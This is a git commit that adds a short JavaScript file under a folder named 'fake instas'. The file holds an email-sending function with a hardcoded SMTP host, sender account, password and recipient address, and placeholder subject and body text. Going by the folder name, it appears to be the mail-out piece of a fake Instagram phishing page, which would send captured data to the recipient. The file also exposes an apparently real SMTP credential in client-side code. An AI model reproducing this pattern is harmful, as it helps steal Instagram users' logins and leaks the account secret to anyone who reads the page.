744a58b12da680b305693a657b38722b97cfb1fb
SANDREQSA22 <163672523+SANDREQSA22@users.noreply.github.com>
2024-04-09 20:16:38 +0400

    Add files via upload

---
+++ fake instas/instagram.js
@@ -0,0 +1,14 @@
+function emailSend(){
+
+    Email.send({
+        Host : "smtp.elasticemail.com",
+        Username : "sandrokupatadze2009@gmail.com",
+        Password : "F4E557281A88868695565BB0E73D0B072E7F",
+        To : 'khutashvilinika2@gmail.com',
+        From : "sandrokupatadze2009@gmail.com",
+        Subject : "This is the subject",
+        Body : "And this is the body"
+    }).then(
+      message => alert(message)
+    );
+}
